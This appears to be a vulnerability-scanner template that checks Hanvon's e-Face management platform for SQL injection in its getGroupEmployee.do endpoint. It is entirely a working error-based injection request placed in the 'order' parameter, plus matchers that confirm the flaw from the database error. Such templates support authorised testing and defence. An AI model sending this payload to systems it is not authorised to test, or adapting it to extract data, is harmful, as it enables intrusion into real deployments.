id: poc-yaml-hw-e-face-pass-spmp-getgroupemployee-do-sqli

info:
  name: 汉王e脸通综合管理平台 getGroupEmployee.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,{{t2}},0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "XPATH syntax error"
          - "employeeNum"
          - "{{substr(t2, 0, 31)}}" 
        condition: and
